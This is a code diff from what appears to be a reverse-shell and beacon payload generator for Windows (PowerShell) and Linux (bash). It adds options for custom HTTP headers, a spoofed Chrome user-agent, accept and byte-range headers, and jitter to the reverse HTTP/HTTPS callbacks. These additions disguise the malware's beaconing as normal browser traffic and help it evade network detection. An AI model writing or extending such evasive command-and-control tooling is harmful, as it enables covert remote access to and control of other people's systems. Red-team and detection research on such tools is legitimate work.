@@ -18,15 +18,18 @@ brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
 
 
-def generate_payload_windows(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval, no_child=None):
+def generate_payload_windows(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval, no_child=None, headers=None, useragent=None, accept=None, byte_range=None, jitter=0):
+    if not useragent or useragent is None:
+        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+
     if payload_type == "tcp":
         raw = powershell_reverse_tcp.generate_powershell_reverse_tcp(ip, port, obs, use_ssl, no_child)
 
     elif payload_type == "http":
-        raw = powershell_reverse_http.generate_windows_powershell_http(ip, port, obs, beacon_interval, no_child)
+        raw = powershell_reverse_http.generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, no_child=None)
 
     elif payload_type == "https":
-        raw = powershell_reverse_https.generate_windows_powershell_https(ip, port, obs, beacon_interval, no_child)
+        raw = powershell_reverse_https.generate_windows_powershell_https(ip, port, obs, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, no_child=None)
 
     if raw:
         return raw
@@ -39,7 +42,10 @@ def generate_payload_windows(ip, port, obs, use_ssl, format_type, payload_type, 
 
 
 
-def generate_payload_linux(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval):
+def generate_payload_linux(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval, headers=None, useragent=None, accept=None, byte_range=None, jitter=0):
+    if not useragent or useragent is None:
+        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+
     if payload_type == "tcp":
         raw = bash_reverse_tcp.generate_bash_reverse_tcp(ip, port, obs, use_ssl)
 
